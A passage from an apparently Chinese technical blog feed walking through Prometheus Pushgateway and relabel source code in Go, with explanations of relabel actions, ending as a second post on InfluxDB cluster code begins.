class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ms := storage.NewDiskMetricStore(*persistenceFile, *persistenceInterval, prometheus.DefaultGatherer, logger)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a Gatherer combining the DefaultGatherer and the metrics from the metric store.</span></span><br><span class="line">g := prometheus.Gatherers&#123;</span><br><span class="line">prometheus.DefaultGatherer,</span><br><span class="line">prometheus.GathererFunc(<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="params">([]*dto.MetricFamily, error)</span></span> &#123; <span class="keyword">return</span> ms.GetMetricFamilies(), <span class="literal">nil</span> &#125;),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r := httprouter.New()</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/-/healthy"</span>, handler.Healthy(ms))</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/-/ready"</span>, handler.Ready(ms))</span><br><span class="line">r.Handler(</span><br><span class="line"><span class="string">"GET"</span>, path.Join(*routePrefix, *metricsPath),</span><br><span class="line">promhttp.HandlerFor(g, promhttp.HandlerOpts&#123;</span><br><span class="line">ErrorLog: logFunc(level.Error(logger).Log),</span><br><span class="line">&#125;),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *enableAdminAPI &#123;</span><br><span class="line"><span class="comment">// To be consistent with Prometheus codebase and provide endpoint versioning, we use the same path</span></span><br><span class="line"><span class="comment">// as Prometheus for its admin endpoints, even if this may feel excesive for just one simple endpoint</span></span><br><span class="line"><span class="comment">// this will likely change over time.</span></span><br><span class="line">r.Handler(<span class="string">"PUT"</span>, *routePrefix+<span class="string">"/api/v1/admin/wipe"</span>, handler.WipeMetricStore(ms, logger))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handlers for pushing and deleting metrics.</span></span><br><span class="line">pushAPIPath := *routePrefix + <span class="string">"/metrics"</span></span><br><span class="line"><span class="keyword">for</span> _, suffix := <span class="keyword">range</span> []<span class="keyword">string</span>&#123;<span class="string">""</span>, handler.Base64Suffix&#125; &#123;</span><br><span class="line">jobBase64Encoded := suffix == handler.Base64Suffix</span><br><span class="line">r.PUT(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job/*labels"</span>, handler.Push(ms, <span class="literal">true</span>, jobBase64Encoded, logger))</span><br><span class="line">r.POST(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job/*labels"</span>, handler.Push(ms, <span class="literal">false</span>, jobBase64Encoded, logger))</span><br><span class="line">r.DELETE(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job/*labels"</span>, handler.Delete(ms, jobBase64Encoded, logger))</span><br><span class="line">r.PUT(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job"</span>, handler.Push(ms, <span class="literal">true</span>, jobBase64Encoded, logger))</span><br><span class="line">r.POST(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job"</span>, handler.Push(ms, <span class="literal">false</span>, jobBase64Encoded, logger))</span><br><span class="line">r.DELETE(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job"</span>, handler.Delete(ms, jobBase64Encoded, logger))</span><br><span class="line">&#125;</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/static/*filepath"</span>, handler.Static(asset.Assets, *routePrefix))</span><br><span class="line"></span><br><span class="line">statusHandler := handler.Status(ms, asset.Assets, flags, externalPathPrefix, logger)</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/status"</span>, statusHandler)</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/"</span>, statusHandler)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Re-enable pprof.</span></span><br><span class="line">r.GET(*routePrefix+<span class="string">"/debug/pprof/*pprof"</span>, handlePprof)</span><br><span class="line"></span><br><span class="line">level.Info(logger).Log(<span class="string">"listen_address"</span>, *listenAddress)</span><br><span class="line">l, err := net.Listen(<span class="string">"tcp"</span>, *listenAddress)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(logger).Log(<span class="string">"err"</span>, err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">quitCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">quitHandler := http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">"Requesting termination... Goodbye!"</span>)</span><br><span class="line"><span class="built_in">close</span>(quitCh)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">forbiddenAPINotEnabled := http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusForbidden)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Lifecycle API is not enabled."</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *enableLifeCycle &#123;</span><br><span class="line">r.Handler(<span class="string">"PUT"</span>, *routePrefix+<span class="string">"/-/quit"</span>, quitHandler)</span><br><span class="line">r.Handler(<span class="string">"POST"</span>, *routePrefix+<span class="string">"/-/quit"</span>, quitHandler)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r.Handler(<span class="string">"PUT"</span>, *routePrefix+<span class="string">"/-/quit"</span>, forbiddenAPINotEnabled)</span><br><span class="line">r.Handler(<span class="string">"POST"</span>, *routePrefix+<span class="string">"/-/quit"</span>, forbiddenAPINotEnabled)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r.Handler(<span class="string">"GET"</span>, <span class="string">"/-/quit"</span>, http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusMethodNotAllowed)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Only POST or PUT requests allowed."</span>))</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> closeListenerOnQuit(l, quitCh, logger)</span><br><span class="line">err = (&amp;http.Server&#123;Addr: *listenAddress, Handler: r&#125;).Serve(l)</span><br><span class="line">level.Error(logger).Log(<span class="string">"msg"</span>, <span class="string">"HTTP server stopped"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="comment">// To give running connections a chance to submit their payload, we wait</span></span><br><span class="line"><span class="comment">// for 1sec, but we don't want to wait long (e.g. until all connections</span></span><br><span class="line"><span class="comment">// are done) to not delay the shutdown.</span></span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line"><span class="keyword">if</span> err := ms.Shutdown(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(logger).Log(<span class="string">"msg"</span>, <span class="string">"problem shutting down metric storage"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过push到接口metric传递数据到prometheus，push接口调用push函数去使用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Push returns an http.Handler which accepts samples over HTTP and stores them</span></span><br><span class="line"><span class="comment">// in the MetricStore. If replace is true, all metrics for the job and instance</span></span><br><span class="line"><span class="comment">// given by the request are deleted before new ones are stored.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The returned handler is already instrumented for Prometheus.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">ms storage.MetricStore, replace <span class="keyword">bool</span>, jobBase64Encoded <span class="keyword">bool</span>, logger log.Logger,</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> <span class="title">func</span><span class="params">(http.ResponseWriter, *http.Request, httprouter.Params)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> ps httprouter.Params</span><br><span class="line"><span class="keyword">var</span> mtx sync.Mutex <span class="comment">// Protects ps.</span></span><br><span class="line"></span><br><span class="line">handler := http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">job := ps.ByName(<span class="string">"job"</span>)</span><br><span class="line"><span class="keyword">if</span> jobBase64Encoded &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> job, err = decodeBase64(job); err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, fmt.Sprintf(<span class="string">"invalid base64 encoding in job name %q: %v"</span>, ps.ByName(<span class="string">"job"</span>), err), http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"invalid base64 encoding in job name"</span>, <span class="string">"job"</span>, ps.ByName(<span class="string">"job"</span>), <span class="string">"err"</span>, err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">labelsString := ps.ByName(<span class="string">"labels"</span>)</span><br><span class="line">mtx.Unlock()</span><br><span class="line"></span><br><span class="line">labels, err := splitLabels(labelsString)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, err.Error(), http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"failed to parse URL"</span>, <span class="string">"url"</span>, labelsString, <span class="string">"err"</span>, err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> job == <span class="string">""</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">"job name is required"</span>, http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"job name is required"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">labels[<span class="string">"job"</span>] = job</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> metricFamilies <span class="keyword">map</span>[<span class="keyword">string</span>]*dto.MetricFamily</span><br><span class="line">ctMediatype, ctParams, ctErr := mime.ParseMediaType(r.Header.Get(<span class="string">"Content-Type"</span>))</span><br><span class="line"><span class="keyword">if</span> ctErr == <span class="literal">nil</span> &amp;&amp; ctMediatype == <span class="string">"application/vnd.google.protobuf"</span> &amp;&amp;</span><br><span class="line">ctParams[<span class="string">"encoding"</span>] == <span class="string">"delimited"</span> &amp;&amp;</span><br><span class="line">ctParams[<span class="string">"proto"</span>] == <span class="string">"io.prometheus.client.MetricFamily"</span> &#123;</span><br><span class="line">metricFamilies = <span class="keyword">map</span>[<span class="keyword">string</span>]*dto.MetricFamily&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">mf := &amp;dto.MetricFamily&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> _, err = pbutil.ReadDelimited(r.Body, mf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">metricFamilies[mf.GetName()] = mf</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// We could do further content-type checks here, but the</span></span><br><span class="line"><span class="comment">// fallback for now will anyway be the text format</span></span><br><span class="line"><span class="comment">// version 0.0.4, so just go for it and see if it works.</span></span><br><span class="line"><span class="keyword">var</span> parser expfmt.TextParser</span><br><span class="line">metricFamilies, err = parser.TextToMetricFamilies(r.Body)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, err.Error(), http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"failed to parse text"</span>, <span class="string">"err"</span>, err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">now := time.Now()</span><br><span class="line">errCh := <span class="built_in">make</span>(<span class="keyword">chan</span> error, <span class="number">1</span>)</span><br><span class="line">errReceived := <span class="literal">false</span></span><br><span class="line">ms.SubmitWriteRequest(storage.WriteRequest&#123;</span><br><span class="line">Labels:         labels,</span><br><span class="line">Timestamp:      now,</span><br><span class="line">MetricFamilies: metricFamilies,</span><br><span class="line">Replace:        replace,</span><br><span class="line">Done:           errCh,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">for</span> err := <span class="keyword">range</span> errCh &#123;</span><br><span class="line"><span class="comment">// Send only first error via HTTP, but log all of them.</span></span><br><span class="line"><span class="comment">// TODO(beorn): Consider sending all errors once we</span></span><br><span class="line"><span class="comment">// have a use case. (Currently, at most one error is</span></span><br><span class="line"><span class="comment">// produced.)</span></span><br><span class="line"><span class="keyword">if</span> !errReceived &#123;</span><br><span class="line">http.Error(</span><br><span class="line">w,</span><br><span class="line">fmt.Sprintf(<span class="string">"pushed metrics are invalid or inconsistent with existing metrics: %v"</span>, err),</span><br><span class="line">http.StatusBadRequest,</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">level.Error(logger).Log(</span><br><span class="line"><span class="string">"msg"</span>, <span class="string">"pushed metrics are invalid or inconsistent with existing metrics"</span>,</span><br><span class="line"><span class="string">"method"</span>, r.Method,</span><br><span class="line"><span class="string">"source"</span>, r.RemoteAddr,</span><br><span class="line"><span class="string">"err"</span>, err.Error(),</span><br><span class="line">)</span><br><span class="line">errReceived = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">instrumentedHandler := promhttp.InstrumentHandlerRequestSize(</span><br><span class="line">httpPushSize, promhttp.InstrumentHandlerDuration(</span><br><span class="line">httpPushDuration, promhttp.InstrumentHandlerCounter(</span><br><span class="line">httpCnt.MustCurryWith(prometheus.Labels&#123;<span class="string">"handler"</span>: <span class="string">"push"</span>&#125;),</span><br><span class="line">handler,</span><br><span class="line">)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request, params httprouter.Params)</span></span> &#123;</span><br><span class="line">mtx.Lock()</span><br><span class="line">ps = params</span><br><span class="line">instrumentedHandler.ServeHTTP(w, r)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据push完会放入pushgateway的缓存队列中存储，prometheus通过配置，采用pull的方式拉取数据获取指标。</p><h2 id="relabel"><a href="#relabel" class="headerlink" title="relabel"></a>relabel</h2><p>relabel功能主要是用于实现多数据中心的监控数据聚合。Relabel可以在Prometheus采集数据之前，通过Target实例的Metadata信息，动态重新写入Label的值。relabel可以对Target实例进行过滤和选择。</p><p>relabel实现过程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Process returns a relabeled copy of the given label set. The relabel configurations</span></span><br><span class="line"><span class="comment">// are applied in order of input.</span></span><br><span class="line"><span class="comment">// If a label set is dropped, nil is returned.</span></span><br><span class="line"><span class="comment">// May return the input labelSet modified.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Process</span><span class="params">(labels model.LabelSet, cfgs ...*config.RelabelConfig)</span> <span class="title">model</span>.<span class="title">LabelSet</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, cfg := <span class="keyword">range</span> cfgs &#123;</span><br><span class="line">labels = relabel(labels, cfg)</span><br><span class="line"><span class="keyword">if</span> labels == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> labels</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用process函数来处理，针对每个配置进行relabel操作。</p><p>relabel函数实现，relabel的类型有：RelabelDrop， RelabelKeep，RelabelReplace，RelabelLabelMap，RelabelLabelDrop，RelabelLabelKeep，RelabelHashMod</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">relabel</span><span class="params">(labels model.LabelSet, cfg *config.RelabelConfig)</span> <span class="title">model</span>.<span class="title">LabelSet</span></span> &#123;</span><br><span class="line">values := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(cfg.SourceLabels))</span><br><span class="line"><span class="keyword">for</span> _, ln := <span class="keyword">range</span> cfg.SourceLabels &#123;</span><br><span class="line">values = <span class="built_in">append</span>(values, <span class="keyword">string</span>(labels[ln]))</span><br><span class="line">&#125;</span><br><span class="line">val := strings.Join(values, cfg.Separator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> cfg.Action &#123;</span><br><span class="line"><span class="keyword">case</span> config.RelabelDrop:</span><br><span class="line"><span class="keyword">if</span> cfg.Regex.MatchString(val) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> config.RelabelKeep:</span><br><span class="line"><span class="keyword">if</span> !cfg.Regex.MatchString(val) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> config.RelabelReplace:</span><br><span class="line">indexes := cfg.Regex.FindStringSubmatchIndex(val)</span><br><span class="line"><span class="comment">// If there is no match no replacement must take place.</span></span><br><span class="line"><span class="keyword">if</span> indexes == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">target := model.LabelName(cfg.Regex.ExpandString([]<span class="keyword">byte</span>&#123;&#125;, cfg.TargetLabel, val, indexes))</span><br><span class="line"><span class="keyword">if</span> !target.IsValid() &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, model.LabelName(cfg.TargetLabel))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">res := cfg.Regex.ExpandString([]<span class="keyword">byte</span>&#123;&#125;, cfg.Replacement, val, indexes)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, model.LabelName(cfg.TargetLabel))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">labels[target] = model.LabelValue(res)</span><br><span class="line"><span class="keyword">case</span> config.RelabelHashMod:</span><br><span class="line">mod := sum64(md5.Sum([]<span class="keyword">byte</span>(val))) % cfg.Modulus</span><br><span class="line">labels[model.LabelName(cfg.TargetLabel)] = model.LabelValue(fmt.Sprintf(<span class="string">"%d"</span>, mod))</span><br><span class="line"><span class="keyword">case</span> config.RelabelLabelMap:</span><br><span class="line">out := <span class="built_in">make</span>(model.LabelSet, <span class="built_in">len</span>(labels))</span><br><span class="line"><span class="comment">// Take a copy to avoid infinite loops.</span></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> labels &#123;</span><br><span class="line">out[ln] = lv</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> labels &#123;</span><br><span class="line"><span class="keyword">if</span> cfg.Regex.MatchString(<span class="keyword">string</span>(ln)) &#123;</span><br><span class="line">res := cfg.Regex.ReplaceAllString(<span class="keyword">string</span>(ln), cfg.Replacement)</span><br><span class="line">out[model.LabelName(res)] = lv</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">labels = out</span><br><span class="line"><span class="keyword">case</span> config.RelabelLabelDrop:</span><br><span class="line"><span class="keyword">for</span> ln := <span class="keyword">range</span> labels &#123;</span><br><span class="line"><span class="keyword">if</span> cfg.Regex.MatchString(<span class="keyword">string</span>(ln)) &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, ln)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> config.RelabelLabelKeep:</span><br><span class="line"><span class="keyword">for</span> ln := <span class="keyword">range</span> labels &#123;</span><br><span class="line"><span class="keyword">if</span> !cfg.Regex.MatchString(<span class="keyword">string</span>(ln)) &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, ln)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">panic</span>(fmt.Errorf(<span class="string">"retrieval.relabel: unknown relabel action type %q"</span>, cfg.Action))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> labels</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>action=keep, 丢弃指定源标签的标签值没有匹配到regex的target</p><p>action=drop，丢弃指定源标签的标签值匹配到regex的target</p><p>action=labeldrop，丢弃匹配到regex 的标签</p><p>action=labelkeep，丢弃没有匹配到regex 的标签</p><p>action=replace，更改标签名、更改标签值、合并标签</p><p>action=hashmod，将多个源标签的值进行hash，作为target标签的值</p><p>action=labelmap，Regex匹配名-&gt;replacement用原标签名的部分来替换名</p><p><strong>replace是缺省action，可以不配置action</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/c21d399c140a" target="_blank" rel="noopener">https://www.jianshu.com/p/c21d399c140a</a></p><p><a href="https://blog.csdn.net/luanpeng825485697/article/details/82318204" target="_blank" rel="noopener">https://blog.csdn.net/luanpeng825485697/article/details/82318204</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Prometheus-架构和源码&quot;&gt;&lt;a href=&quot;#Prometheus-架构和源码&quot; class=&quot;headerlink&quot; title=&quot;Prometheus 架构和源码&quot;&gt;&lt;/a&gt;Prometheus 架构和源码&lt;/h1&gt;&lt;h2 id=&quot;Prometheu
      
    
    </summary>
    
    
      <category term="prometheus" scheme="http://www.yorzorzy.xyz/categories/prometheus/"/>
    
    
      <category term="monitor" scheme="http://www.yorzorzy.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>influxdb集群代码分析</title>
    <link href="http://www.yorzorzy.xyz/2020/02/17/influxdb%20%E9%9B%86%E7%BE%A4%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.yorzorzy.xyz/2020/02/17/influxdb%20%E9%9B%86%E7%BE%A4%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-02-17T03:14:59.099Z</published>
    <updated>2020-02-17T03:13:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="influxdb集群代码分析"><a href="#influxdb集群代码分析" class="headerlink" title="influxdb集群代码分析"></a>influxdb集群代码分析</h2><p>本文主要分析下influxdb中cluster部分的代码：</p><p>入口函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span> <span class="title">OpenDataServer</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> 